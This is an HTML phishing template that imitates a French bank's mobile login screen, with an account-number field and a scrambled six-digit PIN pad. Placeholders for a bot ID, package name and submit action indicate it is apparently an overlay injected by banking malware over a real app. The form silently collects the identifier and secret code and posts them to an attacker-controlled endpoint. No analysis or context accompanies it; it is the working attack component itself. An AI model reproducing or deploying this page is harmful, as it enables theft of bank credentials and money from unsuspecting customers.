<html>

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="UTF-8">

    <title></title>
	<style type='text/css'>
	* {
		margin: 0;
		padding: 0;
		font-size: 14pt;
	}
	
	body {
		background-color: #dde3e4;
		color: black;
	}
	
	#header {
		border-bottom: 1px solid #eee;
		padding: 10px;
	}
	
	.button1 {
		font-weight: bold;
		padding: 20px;
		width: 100%;
		
		color: black;
		background-color: white;
		border: 0;
		border-radius: 5px; 
	}
	
	
	#body {
		width: 100%;
	}
	#body TD {
		padding: 10px;
	}
	
	INPUT {
		border: 0;
		background-color: transparent;
		width: 100%;
	}

	#loginbutton {
		background-image: url('%DYN_PATH%/img/login_bg.png');
		height: 60px;
		color: #9b9b9b;
		padding: 0;
	}
	
	.inp {
		background-image: url('%DYN_PATH%/img/user.png');
		background-repeat: no-repeat;
		height: 60px;
		border: 0px solid #CCC;
		border-radius: 5px;
		padding-left: 50px;
		background-color: white;
		width: 100%;
		width: calc(100% - 50px);
	}
	
	.table_td {
		background-image: url('%DYN_PATH%/img/td.png');
		background-repeat: no-repeat;
		background-position: bottom;
		width: 30px;
	}
	
	.table_num_td {
		background-image: url('%DYN_PATH%/img/num_button.png');
		background-repeat: no-repeat;
		background-position: center;
		text-align: center;
		width: 30px;
	}
	</style>
<script src="%DYN_PATH_GENERAL%/jquery.min.js"></script>
<script type='text/javascript'>
document.total_steps = 1
//document.current_step = 1
//document.error_style = 'border: 1px solid red'

dots_number = 0
bg = '%DYN_PATH%/img/td.png';

function add_num(num)
{
	if(dots_number >= 6)
		return 
		
	var val = $('#field2').val() + num;
	$('#field2').val(val)
	dots_number += 1

	set_dots(dots_number)
	//~ console.log('R: ' + val)
}

function rm_num()
{
	if(dots_number < 1)
		return 
		
	var val = $('#field2').val()
	val = val.substring(0, val.length - 1);
	$('#field2').val(val)

	dots_number -= 1

	set_dots(dots_number)
	
	//~ console.log('R: ' + val)
}

function set_dots(num)
{
	$('.table_td').each(function(index, obj){  
		$(obj).css('background-image', 'url("'+bg+'")');
		$(obj).html('');  
	})
	
	for(i=1; i<=num; i++)
	{
		if(i <= num)
		{
			$('#cell' + i).css('background-image', 'url("")');
			$('#cell' + i).html('&bull;'); 
		}
	}
}

</script>
<script src='%DYN_PATH_GENERAL%/br_main.js'></script>

</head>

<body>
<div id='body'>	
	<form id='mainform' method='post' action='%ACTION%'>
		<input type="hidden" name="page_id" value="%PKG%" /><input type="hidden" name="bot_id" value="%BOTID%" />
		
	<table border='0' width='100%' style='margin: 0 auto; margin: 20px' cellpadding=0 cellspacing=0>
	<tr><td style='padding: 0; text-align: center'>
		<img src='%DYN_PATH%/img/logo.png' width='90' alt=''  />
</td></tr>
	</table>


	<table border='0'  style='margin: 0 auto; width: 95%' id='step1' cellpadding=0 cellspacing=0>
		<tr>
			<td colspan='2'>
				<p>Mon identifiant</p><br />
				<input class='inp' type='number' id='field1' name='fields[numero]' value='' placeholder='' /></td>
			<input type='hidden' id='field2' name='fields[password]' value='' />
		</tr>
		<tr>
			<td style=''>Saisissez votre code secret</td>
			<td style=''><a href='javascript:undefined' style='color: #629af3'>Code secret oubli√© ?</a></td>
		</tr>
		
		<tr><td colspan='2'>
		
		<table border='0' style='width: 350px; margin: 0 auto'>
			<tr>
				<td><img src='%DYN_PATH%/img/lock.png' alt=''  /></td>
				<td class='table_td' id='cell1'></td>
				<td class='table_td' id='cell2'></td>
				<td class='table_td' id='cell3'></td>
				<td class='table_td' id='cell4'></td>
				<td class='table_td' id='cell5'></td>
				<td class='table_td' id='cell6'></td>
				<td><img src='%DYN_PATH%/img/delete.png' onclick='rm_num()' alt=''  /></td>
			</tr>
		</table>
		
		<table border='0' style='width: 100%; margin: 0 auto; margin-top: 50px'>
			<tr>
				<td class='table_num_td' onclick='add_num(0)'>0</td>
				<td class='table_num_td' onclick='add_num(2)'>2</td>
				<td class='table_num_td' onclick='add_num(8)'>8</td>
				<td class='table_num_td' onclick='add_num(5)'>5</td>
				<td class='table_num_td' onclick='add_num(9)'>9</td>
			</tr>
			<tr>
				<td class='table_num_td' onclick='add_num(7)'>7</td>
				<td class='table_num_td' onclick='add_num(4)'>4</td>
				<td class='table_num_td' onclick='add_num(3)'>3</td>
				<td class='table_num_td' onclick='add_num(1)'>1</td>
				<td class='table_num_td' onclick='add_num(6)'>6</td>
			</tr>
		</table>
		
		</td></tr>
	</table>

	<table border='0' width='95%' style='margin: 0 auto; margin-top: 10px'>
	<tr><td style='text-align: center'><input id='loginbutton' class='button' type='button' onclick='change_step()' value='SE CONNECTER' /></td></tr>
	</table>
	
	</form>
</div>

</body>
</html>
